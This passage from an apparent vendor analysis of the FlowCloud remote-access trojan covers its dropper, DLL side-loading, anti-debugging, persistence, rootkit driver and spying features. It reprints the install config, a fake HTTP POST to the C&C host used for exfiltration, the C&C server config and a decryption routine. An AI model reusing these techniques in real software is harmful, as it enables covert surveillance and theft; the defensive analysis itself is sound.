<p>The first stage is responsible mostly for creating the files and registry keys used by the other stages. The values for these executables and configuration data can be found, encrypted, in the loader’s resource section. Table 1 contains an overview of these resources and their use.</p>
<p style="text-align: center;"><em>Table 1. Contents of the dropper’s resources</em></p>
<p><table>
<thead>
<tr>
<th>Resource ID</th>
<th>Role</th>
<th>Internal name</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>100</strong></td>
<td>FlowCloud RAT DLL</td>
<td><span style="font-family: courier new, courier, monospace;">fcClientDll </span></td>
</tr>
<tr>
<td><strong>101</strong></td>
<td>32-bit rootkit driver</td>
<td><span style="font-family: courier new, courier, monospace;">Driver</span></td>
</tr>
<tr>
<td><strong>102</strong></td>
<td>64-bit rootkit driver</td>
<td><span style="font-family: courier new, courier, monospace;">Driver</span></td>
</tr>
<tr>
<td><strong>103</strong></td>
<td>DLL hijacking vulnerable app</td>
<td>N/A</td>
</tr>
<tr>
<td><strong>104</strong></td>
<td>Shellcode loaded by the malicious library in the DLL hijacking</td>
<td><span style="font-family: courier new, courier, monospace;">SETLANG_dlcore</span></td>
</tr>
<tr>
<td><strong>105</strong></td>
<td>Shellcode that loads <span style="font-family: courier new, courier, monospace;">fcClient</span> (unused)</td>
<td>N/A</td>
</tr>
<tr>
<td><strong>106</strong></td>
<td>Final dropper stage</td>
<td><span style="font-family: courier new, courier, monospace;">fcClient</span></td>
</tr>
<tr>
<td><strong>107</strong></td>
<td>32-bit persistence module</td>
<td><span style="font-family: courier new, courier, monospace;">fcClientWD_x86</span></td>
</tr>
<tr>
<td><strong>108</strong></td>
<td>64-bit persistence module</td>
<td><span style="font-family: courier new, courier, monospace;">fcClientWD_x64</span></td>
</tr>
<tr>
<td><strong>109</strong></td>
<td>Legitimate library used for module stomping</td>
<td><span style="font-family: courier new, courier, monospace;">slam</span></td>
</tr>
<tr>
<td><strong>110</strong></td>
<td>DLL used for hijacking</td>
<td><span style="font-family: courier new, courier, monospace;">XXXModule_dlcore0</span></td>
</tr>
<tr>
<td><strong>1000</strong></td>
<td>Protobuf serialized FlowCloud configuration</td>
<td>N/A</td>
</tr>
<tr>
<td><strong>1001</strong></td>
<td>Dropper configuration</td>
<td>N/A</td>
</tr>
<tr>
<td><strong>2000</strong></td>
<td>Used as an alternative or extension to resource 2001</td>
<td>N/A</td>
</tr>
<tr>
<td><strong>2001</strong></td>
<td>Path to the registry key for the PrintProcessor service (used by the driver)</td>
<td>N/A</td>
</tr>
<tr>
<td><strong>10000</strong></td>
<td>Installation configuration</td>
<td>N/A</td>
</tr>
</tbody>
</table></p>
<p>In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed. In some cases, they are then re-encrypted but with a different key. This technique makes it harder to dump the plaintext values from the process’s memory and to analyze exit dumps. The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration. The samples we analyzed all store their files in the <span style="font-family: 'courier new', courier, monospace;">%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\</span> directory; we believe that this is the default value. FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., <span style="font-family: 'courier new', courier, monospace;">rebare.dll</span> which could be mistaken for <span style="font-family: 'courier new', courier, monospace;">rebar.dll</span>) or innocuous looking (e.g., <span style="font-family: 'courier new', courier, monospace;">AC146142</span>) to avoid suspicion.</p>
<p>Figure 7 presents a graphical overview of the deployment process and its elements. We explain each of the steps in further detail in the upcoming sections.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-7.-FlowCloud-deployment-process.png"><img class="wp-image-161827" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-7.-FlowCloud-deployment-process.png" alt="" width="750" height="1002" /></a><p class="caption-text"><em>Figure 7. FlowCloud deployment process</em></p></div></p>
<p>First, the loader decrypts and parses the embedded installation configuration, which uses the Windows INI format. This configuration defines the malware’s install path along with the filename or registry key where each embedded resource is to be written. The same values are hardcoded in the following stages, which leads us to think that the samples are generated using a builder. In a sample we analyzed, this configuration is accompanied with comments explaining the values for some sections. Figure 8 shows this installation configuration with the comments translated into English.</p>
<pre class="language-bash" title=""><code>#Product name, these will be used in the configuration generator and applied to the front end
[product]
product_chs_name=Sky Arrow
product_name=PCArrowI
product_version=v5.0.2

[general]
created_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole
install_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole
data_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\fcdata

hide_user_activity_tab = 0

#File path, not including drive letter
[file]
100=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\responsor.dat
103=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlang.exe
104=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dat
#105=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rebare.dat
106=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure.dat
107=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure86.dat
108=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure64.dat
109=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\sspisrvui.dat
110=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dll
101=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E86F36C4
102=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\AC146142
1000=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E19D9D4B

#0x0001 Release without decryption
#0x0002 Decryption release
[file_out_type]
100=0x0001
103=0x0002
104=0x0002
#105=0x0002
106=0x0002
107=0x0002
108=0x0002
109=0x0002
110=0x0002
101=0x0001
102=0x0001
1000=0x0001

##Registry path: separated by'|', respectively representing HKEY_LOCAL_MACHINE, path name, value name
[key]
##100=0x80000002|SYSTEM\Setup\PrintResponsor|1
#101=0x80000002|SYSTEM\Setup\PrintResponsor|2
#102=0x80000002|SYSTEM\Setup\PrintResponsor|3
#1000=0x80000002|SYSTEM\Setup\PrintResponsor|4
##2000=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1
##2001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|2
2001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1

##0x0001 Release without decryption
##0x0002 Decryption release
[key_out_type]
##100=0x0001
#101=0x0001
#102=0x0001
#1000=0x0001
#2000=0x0002
2001=0x0002

#Service Information: hhw.exe needs to be dynamically generated
[service_attribute]
is_hhw=0
service_name=PrintResponsor
service_path=%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\setlang.exe
service_parm=</code></pre>
<p><em>Figure 8. Installation configuration with explanatory comments. Note that some fields are commented out.</em></p>
<p>The configuration can also contain a section defining specific security software to check for, but this isn’t implemented in the loaders we analyzed. However, there is a custom <span style="font-family: 'courier new', courier, monospace;">AntivirusCheck</span> class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro. This class is only used if the loader is set to directly start the <span style="font-family: 'courier new', courier, monospace;">fcClient</span> module via the <span style="font-family: 'courier new', courier, monospace;">auto_start_after_install</span> configuration key.</p>
<p>Depending on the configuration keys used, the loader can either load the <span style="font-family: 'courier new', courier, monospace;">fcClientDll</span> RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task. In the former case, the task or service attains persistence by being set to start automatically on boot. In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking. The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources.</p>
<h4><em><strong>DLL side-loading (</strong></em><strong><span style="font-family: 'courier new', courier, monospace;">XXXModule_dlcore0</span></strong><em><strong>)</strong></em></h4>
<p>In the samples we analyzed, the vulnerable application was either <span style="font-family: 'courier new', courier, monospace;">setlang.exe</span> from Microsoft Office 2003 with a malicious <span style="font-family: 'courier new', courier, monospace;">setlangloc.dll</span> or <span style="font-family: 'courier new', courier, monospace;">vpreview.exe</span> from Visio Preview 2007 with a malicious <span style="font-family: 'courier new', courier, monospace;">vviewres.dll</span>. Strings contained in the malicious DLL also point to <span style="font-family: 'courier new', courier, monospace;">emedres.dll</span> from Emurasoft’s EmEditor as a possible third target for DLL side-loading. This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it.</p>
<p>In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a <span style="font-family: 'courier new', courier, monospace;">.dat</span> extension. We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library.</p>
<p>Despite its relatively simple goals, the library’s code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis. In the function that loads the next file, the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the program’s flow. As shown in Figure 9, this short snippet is packed full of anti-analysis tricks, but ultimately amounts to an unconditional 16-byte jump. This is enough to foil many automatic analyses, including decompilers.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-9.-Annotated-disassembly-of-the-control-flow-obfuscation-snippet-1.png"><img class="wp-image-161885" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-9.-Annotated-disassembly-of-the-control-flow-obfuscation-snippet-1.png" alt="" width="900" height="232" /></a><p class="caption-text"><em>Figure 9. Annotated disassembly of the control flow obfuscation snippet</em></p></div></p>
<p>The above snippet is bookended by calls to two anti-debugging functions, as can be seen in Figure 10. The function, which we named <span style="font-family: 'courier new', courier, monospace;">crash_if_debugger</span> in the previous screenshot, calls <span style="font-family: 'courier new', courier, monospace;">IsDebuggerPresent</span> and checks some commonly hooked library functions for a breakpoint as their first instruction. If those checks detect a debugger, the function returns a value that will cause the program to jump to an invalid address and crash. The second one raises an exception via the <span style="font-family: 'courier new', courier, monospace;">INT 0x2D</span> instruction and exits if it was handled by a debugger.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-10.-Decompiler-view-showing-the-obvious-pattern-of-anti-debugging-checks.-Note-that-we-had-to-remove-the-aforementioned-obfuscation-for-the-decompiler-to-produce-any-output..png"><img class="wp-image-161829 size-full" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-10.-Decompiler-view-showing-the-obvious-pattern-of-anti-debugging-checks.-Note-that-we-had-to-remove-the-aforementioned-obfuscation-for-the-decompiler-to-produce-any-output..png" alt="" width="579" height="366" /></a><p class="caption-text"><em>Figure 10. Decompiler view showing the obvious pattern of anti-debugging checks. Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.</em></p></div></p>
<h4><strong><em>fcClient (</em><span style="font-family: 'courier new', courier, monospace;">rescure.dat</span><em>)</em></strong></h4>
<p>When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules. It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.</p>
<p>First, persistence is established by using the<span style="font-family: 'courier new', courier, monospace;"> ITaskService</span> COM interface to create the <span style="font-family: 'courier new', courier, monospace;">\Microsoft\Windows\CertificateServicesClient\NetTask</span> scheduled task. If a task with the same name already exists, it is deleted before the new one is created. This task will run the DLL hijacking target as <span style="font-family: 'courier new', courier, monospace;">SYSTEM</span> at each boot.</p>
<p>Afterwards, the rootkit module is decrypted and written to the <span style="font-family: 'courier new', courier, monospace;">%System%\drivers</span> folder as <span style="font-family: 'courier new', courier, monospace;">hidmouse.sys</span>. A <span style="font-family: 'courier new', courier, monospace;">hidmouse</span> service is then created to run that module and is immediately started. The file is then deleted from the disk and replaced by a copy of the legitimate <span style="font-family: 'courier new', courier, monospace;">hidusb.sys</span> driver from the same folder. Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.</p>
<p>On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013. Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.</p>
<p>The following files are copied to the <span style="font-family: 'courier new', courier, monospace;">%System%</span> directory:</p>
<ul>
<li>The backdoor: <span style="font-family: 'courier new', courier, monospace;">rescure.dat</span></li>
<li>A decoy DLL: <span style="font-family: 'courier new', courier, monospace;">sspisrvui.dat</span> as <span style="font-family: 'courier new', courier, monospace;">sspisrvui.dll</span> (<a href="https://attack.mitre.org/versions/v9/techniques/T1070/006/" target="_blank" rel="noopener">timestomped</a> to July 2013)</li>
<li>The encrypted shellcode:<span style="font-family: 'courier new', courier, monospace;"> rebare.dat</span></li>
</ul>
<p>The <span style="font-family: 'courier new', courier, monospace;">rebare.dat</span> shellcode is very similar to that used in the self-decrypting DLL, but it loads <span style="font-family: 'courier new', courier, monospace;">fcClient</span> directly.</p>
<p>FlowCloud then starts a suspended process to perform injection on it. This process is created via <span style="font-family: 'courier new', courier, monospace;">CreateProcessAsUserW</span> using a token retrieved from the <span style="font-family: 'courier new', courier, monospace;">explorer.exe</span> or <span style="font-family: 'courier new', courier, monospace;">winlogon.exe</span> process in the current session.</p>
<p>The injected code loads the same backdoor (<span style="font-family: 'courier new', courier, monospace;">rescure.dat</span>) into the process’s memory and calls its <span style="font-family: 'courier new', courier, monospace;">startModule</span> export to finish the installation. Meanwhile, the injection process is terminated.</p>
<p>At this point, installation of the backdoor is complete. All that is left is to execute the backdoor. To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the <span style="font-family: 'courier new', courier, monospace;">fcClientDll</span> module (a process known as <a href="https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/" target="_blank" rel="noopener"><em>module stomping</em></a> or DLL hollowing), before calling its main function.</p>
<h4><strong><em>fcClientDll (</em><span style="font-family: 'courier new', courier, monospace;">responsor.dat</span><em>)</em></strong></h4>
<p>This complex module is the main component of the backdoor. It provides a wide range of capabilities from full file system access to control of camera peripherals and everything in between. Although we did not observe any plugins, the backdoor contains code that hints that they can be used to further extend functionality.</p>
<p>Before diving deeper into the functionalities, we want to highlight some notable characteristics:</p>
<ul>
<li>Configuration information and data for communications with the C&amp;C server are <a href="https://github.com/protocolbuffers/protobuf" target="_blank" rel="noopener"><em>Protobuf</em></a>-serialized, compressed, and encrypted.</li>
<li>File exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a hardcoded, fake POST request. The <span style="font-family: 'courier new', courier, monospace;">Content-Length</span> header is the only variable element, as it is set to the actual size of the data sent. This hardcoded request can be seen in Figure 11.</li>
<li>Multiple functionalities are implemented through the use of COM objects and interfaces.</li>
</ul>
<pre class="language-bash" title=""><code>POST /messagebroker/amf HTTP/1.1
Host: s.peheavens.com
Connection: keep-alive
Content-Length: &lt;content_length&gt;
Origin: http://s.peheavens.com
X-Requested-With: ShockwaveFlash/20.0.0.306
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
Content-Type: application/x-amf
Accept: */*
Referer: http://s.peheavens.com/html/portlet/ext/draco/resources/draco_manager.swf/[[DYNAMIC]]/1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: COOKIE_SUPPORT=true; JSESSIONID=5C7E7A60D01D2891F40648DAB6CB3DF4.jvm1; COMPANY_ID=10301; ID=666e7375545678695645673d; PASSWORD=7a4b48574d746470447a303d; LOGIN=6863303130; SCREEN_NAME=4a2b455377766b657451493d; GUEST_LANGUAGE_ID=en-US</code></pre>
<p><em>Figure 11. Hardcoded, fake HTTP POST request used for FlowCloud C&amp;C communication</em></p>
<p>This component uses an encrypted, Protobuf-serialized configuration that it tries to read from a file on disk or a registry key. The configurations we observed were composed of three sections:</p>
<ol>
<li><span style="font-family: 'courier new', courier, monospace;">server_config</span>: This section contains information about the C&amp;C servers and identification information about the victim and backdoor.</li>
<li><span style="font-family: 'courier new', courier, monospace;">policys</span> [<em>sic</em>]: This section defines the behavior of the backdoor’s components and is described in detail in the following paragraphs.</li>
<li><span style="font-family: 'courier new', courier, monospace;">install_config</span>: As the name indicates, this section defines the installation parameters.</li>
</ol>
<p>An example of such a <span style="font-family: 'courier new', courier, monospace;">server_config</span> is shown in Figure 12. This configuration corresponds to resource 1000 in the initial loader. It defines the address and port for both the exfiltration server (<span style="font-family: 'courier new', courier, monospace;">file_server</span>) and the C&amp;C server (<span style="font-family: 'courier new', courier, monospace;">exchange_server</span>), along with the encryption key to use for communication with each. A fallback server can also be defined for each of these. The <span style="font-family: 'courier new', courier, monospace;">file_key</span> field defines the encryption key to use when storing files that are to be exfiltrated. The other entries are used to identify the backdoor and the victimized host:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">product_name</span>: A name for the backdoor in use. <span style="font-family: 'courier new', courier, monospace;">PCArrowI</span> seems to correspond to FlowCloud.</li>
<li><span style="font-family: 'courier new', courier, monospace;">product_version</span>: The backdoor’s version.</li>
<li><span style="font-family: 'courier new', courier, monospace;">id_prefix</span>: This value is prefixed to the generated ID. Presumably, used to group victims or campaigns.</li>
<li><span style="font-family: 'courier new', courier, monospace;">id</span>: This value uniquely identifies the victim. Initially, it is empty; the value is generated on the first execution using the following format: <span style="font-family: 'courier new', courier, monospace;">&lt;prefix&gt;_&lt;current timestamp&gt;_&lt;machine hostname&gt;</span></li>
</ul>
<pre class="language-bash" title=""><code>server_config 
{
                                                                                          
  product_name: “PCArrowI"
  product_version: "v5.0.2"
  id: "1202_[REDACTED]"                                  
  root: "" 
  file_server: "47.111.22[.]65"
  file_server_port: "80"
  file_server_bak: ""
  file_server_bak_port: ""
  exchange_server: "47.111.22[.]65"
  exchange_server_port: "81"
  exchange_server_bak: ""
  exchange_server_bak_port: ""
  file_server_key: "E\367\016\031&lt;…&gt;"
  xchg_server_key: "8\335\325$&lt;…&gt;"
  file_key: "U\267\323\353\&lt;…&gt;"           
  is_audio_only: false
  id_prefix: "1202"
}                                                                               
</code></pre>
<p><em>Figure 12. </em><span style="font-family: 'courier new', courier, monospace;">server_config</span> <em>section of a decoded FlowCloud configuration</em></p>
<p>FlowCloud’s capabilities are spread out over a series of singleton classes, each of which implements a cohesive set of functionalities related to a specific type of data or action. These roughly follow an internal naming convention where classes with names ending with<span style="font-family: 'courier new', courier, monospace;"> manager_handler</span> perform actions in response to C&amp;C commands, while those whose names end with <span style="font-family: 'courier new', courier, monospace;">manager</span> automatically perform actions based on timers or event listeners.</p>
<p>Each <span style="font-family: 'courier new', courier, monospace;">manager</span> stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&amp;C server. Data is encrypted with the aforementioned <span style="font-family: 'courier new', courier, monospace;">file_key</span> before being inserted into the database. The location of the SQLite databases is defined by th<span style="font-family: 'courier new', courier, monospace;">e data_folder</span> install configuration key, with the default value being <span style="font-family: 'courier new', courier, monospace;">%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\fcdata</span>.</p>
<p>The classes are orchestrated by an instance of <span style="font-family: 'courier new', courier, monospace;">fc_kernel_manager</span>. This object is responsible for initializing other components and handling C&amp;C connections. It can also update the local configuration when the corresponding command is received.</p>
<p>As shown in Figure 13, parameters and frequency of automated actions can be specified and finely tuned through configuration policies. Data exfiltration is likewise automated: policies can contain a <span style="font-family: 'courier new', courier, monospace;">cache_size</span> or <span style="font-family: 'courier new', courier, monospace;">cache_count</span> parameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration.</p>
<pre class="language-bash" title=""><code>policys {                                                                                                                                                                                     
  keyboard_policy {                                                                                                                                                                           
    state: true                                                                                                                                                                               
    cycle_time: 60                                                                                                                                                                            
    limit_size: 100                                                                                                                                                                           
    cache_size: 10                                                                                                                                                                            
  }                                                                                                                                                                                           
  screen_policy {                                                                                                                                                                             
    state: true                                                                                                                                                                               
    cycle_time: 30                                                                                                                                                                            
    cache_count: 200                                                                                                                                                                          
    bit_depth: 4                                                                                                                                                                              
  }                                                                                                                                                                                           
  audio_policy {                                                                                                                                                                              
    state: false                                                                                                                                                                              
    cache_size: 100                                                                                                                                                                           
    decibel_limit: 65                                                                                                                                                                         
    continue_seconds: 15                                                                                                                                                                      
  }                                                                                                                                                                                           
  smfile_search_policy {                                                                                                                                                                      
    guid: "XXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"                                                                                                                                              
    state: false                                                                                                                                                                              
    research: true                                                                                                                                                                            
    inc_all_removable: true                                                                                                                                                                   
    inc_all_fixed: true                                                                                                                                                                       
    limit_size: 1                                                                                                                                                                             
    recent_days: 30                                                                                                                                                                           
    filter: "*.doc"
    filter: "*.docx"                                                                                                                                                                          
    filter: "*.xls"                                                                                                                                                                           
    filter: "*.xlsx"                                                                                                                                                                          
    filter: "*.ppt"                                                                                                                                                                           
    filter: "*.pptx"                                                                                                                                                                          
    filter: "*.bmp"                                                                                                                                                                           
    filter: "*.jpg"                                                                                                                                                                           
    filter: "*.png"                                                                                                                                                                           
    filter: "*.gif"                                                                                                                                                                           
    cache_size: 1024                                                                                                                                                                          
    b_exclude_system_files: true                                                                                                                                                              
    b_exclude_system_folders: true
  }                                                                                                                                                                                           
  installedapp_policy {                                                                                                                                                                       
    state: false                                                                                                                                                                              
  }                                                                                                                                                                                           
  clipboard_policy {                                                                                                                                                                          
    state: false                                                                                                                                                                              
    ignore_repeat: true                                                                                                                                                                       
    cycle_time: 300                                                                                                                                                                           
    limit_size: 100                                                                                                                                                                           
    single_limit_size: 10                                                                                                                                                                     
    cache_size: 50                                                                                                                                                                            
  }                                                                                                                                                                                           
  user_activity_policy {                                                                                                                                                                      
    process_activity_state: false                                                                                                                                                             
    browser_activity_state: false                                                                                                                                                             
  }                                                                                                                                                                                           
}</code></pre>
<p><em>Figure 13. The </em><span style="font-family: 'courier new', courier, monospace;">policys</span> <em>[sic] section of a decoded FlowCloud config</em></p>
<p>As we have previously mentioned, this implant uses a lot of classes. Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity.</p>
<h4><strong><em>File system</em></strong></h4>
<p>FlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database.</p>
<p>One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the <span style="font-family: 'courier new', courier, monospace;">smfile_search_policy</span>. It also creates an invisible window that listens for file creation, modification, or renaming events. The corresponding files are collected unless they are excluded by that policy.</p>
<p>Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data. This same class collects file and directory metadata.</p>
<p>As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives. This includes bidirectional file transfers between the C&amp;C and the compromised machine.</p>
<h4><strong><em>Programs and processes</em></strong></h4>
<p>FlowCloud is able to automatically obtain a list of installed software through the use of the undocumented<span style="font-family: 'courier new', courier, monospace;"> IShellAppManager</span> COM interface. This functionality can also be invoked via a C&amp;C command. Figure 14 shows, after the extraneous code has been removed, how that interface is used.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-14.-Simplified-code-showing-how-the-IShellAppManager-COM-interface-is-used-to-list-installed-applications.png"><img class="wp-image-161830" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-14.-Simplified-code-showing-how-the-IShellAppManager-COM-interface-is-used-to-list-installed-applications.png" alt="" width="900" height="296" /></a><p class="caption-text"><em>Figure 14. Simplified code showing how the </em><span style="font-family: 'courier new', courier, monospace;">IShellAppManager </span><em>COM interface is used to list installed applications</em></p></div></p>
<p>Other commands can be used to retrieve a detailed list of available services and currently running processes.</p>
<p>Another interesting feature is the near real-time monitoring of process activity. To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events. The obtained information is correlated with data from the <span style="font-family: 'courier new', courier, monospace;">Win32_Process</span> table for a more detailed view.</p>
<h4><strong><em>User activity</em></strong></h4>
<p>FlowCloud is able collect a miscellany of data that we have decided to group under the “User activity” umbrella.</p>
<p>It has the ability to monitor the clipboard for changes and save any data it contains. As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats. This window uses <span style="font-family: 'courier new', courier, monospace;">AddClipboardFormatListener</span> (on Windows Vista or more recent) or <span style="font-family: 'courier new', courier, monospace;">SetClipboardViewer</span> (on Windows XP and prior) to listen for clipboard content changes.</p>
<p><div class="caption center"><a href="https://web-assets.esetstatic.com/wls/2022/04/Figure-15.-Set-up-monitoring-of-the-clipboard.png"><img class="wp-image-161831" src="https://web-assets.esetstatic.com/wls/2022/04/Figure-15.-Set-up-monitoring-of-the-clipboard.png" alt="" width="799" height="419" /></a><p class="caption-text"><em>Figure 15. Set up monitoring of the clipboard</em></p></div></p>
<p>Collected clipboard content is stored along with information about the current foreground window. This information can help attackers understand the data by contextualizing it.</p>
<p>FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input. To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved. This feature can also be invoked on demand by the server.</p>
<p>Another of the backdoor’s components records mouse and keyboard activity to a database. It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the<span style="font-family: 'courier new', courier, monospace;"> \\.\pipe\namedpipe_keymousespy_english</span> named pipe.</p>
<p>Interestingly, FlowCloud can also gather information about things happening around the victim’s computer. The first way it does so is through a C&amp;C command that takes a picture using connected camera peripherals. This feature is implemented using the <span style="font-family: 'courier new', courier, monospace;">CCameraDS</span> class from OpenCV.</p>
<p>The second way it can collect information about the computer’s surroundings is by recording audio. Much like a voice assistant, FlowCloud can use a computer’s microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the <span style="font-family: 'courier new', courier, monospace;">decibel_limit</span> field of the <span style="font-family: 'courier new', courier, monospace;">audio_policy</span>. The default value is 65 decibels, which is in the upper range of normal conversation volume (<a href="https://www.earq.com/hearing-health/decibels" target="_blank" rel="noopener"><em>commonly defined</em></a> to be anywhere between 50 and 70 dB by various sources).</p>
<h4><strong><em>Self-decrypting DLL (<span style="font-family: 'courier new', courier, monospace;">setlangloc.dat</span>)</em></strong></h4>
<p>The loaded shellcode is a self-decrypting DLL. It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in Figure 16). The shellcode we analyzed used the key <span style="font-family: 'courier new', courier, monospace;">0x7B</span>. Once it has decrypted the embedded DLL, the shellcode manually performs the functions of <span style="font-family: 'courier new', courier, monospace;">LoadLibrary</span> and calls the loaded module’s <span style="font-family: 'courier new', courier, monospace;">startModule</span> export.</p>
<pre class="language-bash" title=""><code>for (int i=0; i &lt; ciphertext_length; i++)
     plaintext[i] = ((encrypted[i] ^ key) + key) &amp; 0xFF</code></pre>
<p><em>Figure 16. Pseudocode for the DLL decryption routine</em></p>
<p>This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above. On top of those, it also uses a few tricks of its own:</p>
<ul>
<li>Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to <span style="font-family: 'courier new', courier, monospace;">lstrlenW</span>.</li>
<li>Base64-encoded strings are used for function imports (via <span style="font-family: 'courier new', courier, monospace;">GetProcAddress</span>) and only decoded as needed.</li>
<li>Exits if the process’s executable is not the expected DLL hijacking target (e.g., <span style="font-family: 'courier new', courier, monospace;">setlang.exe</span>).</li>
</ul>
<p>The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region. This code inside the new process launches a thread that decrypts and loads the <span style="font-family: 'courier new', courier, monospace;">fcClient</span> module before calling its <span style="font-family: 'courier new', courier, monospace;">startModule</span> export. That function will perform the final stages of the installation and load the DLL containing the backdoor functionality.</p>
<h4><strong><em>Driver (<span style="font-family: 'courier new', courier, monospace;">hidmouse.sys</span>)</em></strong></h4>
<p>FlowCloud’s driver serves a dual purpose: it acts as both a keylogger and a rootkit. It accomplishes this mainly by hijacking native drivers’ handler functions for specific I/O control codes and replacing them with its own:</p>
<ul>
<li>Read (<span style="font-family: 'courier new', courier, monospace;">IRP_MJ_READ</span>) for the keyboard driver (<span style="font-family: 'courier new', courier, monospace;">kbdclass</span> or <span style="font-family: 'courier new', courier, monospace;">KeyboardClass0</span>)</li>
<li>Read (<span style="font-family: 'courier new', courier, monospace;">IRP_MJ_READ</span>) for the mouse driver (<span style="font-family: 'courier new', courier, monospace;">mouclass</span> or <span style="font-family: 'courier new', courier, monospace;">PointerClass0</span>)</li>
<li>Device control (<span style="font-family: 'courier new', courier, monospace;">IRP_MJ_DEVICE_CONTROL</span>) for the network driver (<span style="font-family: 'courier new', courier, monospace;">tcpip</span> or <span style="font-family: 'courier new', courier, monospace;">nsiproxy</span>)</li>
</ul>
<p>The driver also provides kernel-level functionalities to be used by the RAT. They can be invoked via I/O control codes or by writing to specific registry keys.</p>
<p>This module is signed with a certificate with the thumbprint <span style="font-family: 'courier new', courier, monospace;">02ED6A578C575C8D9C72398E790354B095BB07BC</span>. Issued to Hangzhou Leishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen.</p>
<h4><em><strong>Keylogging</strong></em></h4>
<p>In its <span style="font-family: 'courier new', courier, monospace;">IRP_MJ_READ</span> handlers for keyboard and mouse events, the driver simply records IO events to <a href="https://geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/lookasid/index.htm" target="_blank" rel="noopener"><em>lookaside lists</em></a> before passing them to the legitimate handler. This ensures that the driver doesn’t interfere in a way that could be noticeable by the user. These events are then parsed to the format used by the backdoor’s <span style="font-family: 'courier new', courier, monospace;">keymouse_manager</span> and written to the named pipe <span style="font-family: 'courier new', courier, monospace;">\\.\pipe\namedpipe_keymousespy_english</span>.</p>
<h4><em><strong>Rootkit</strong></em></h4>
<p>After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.</p>
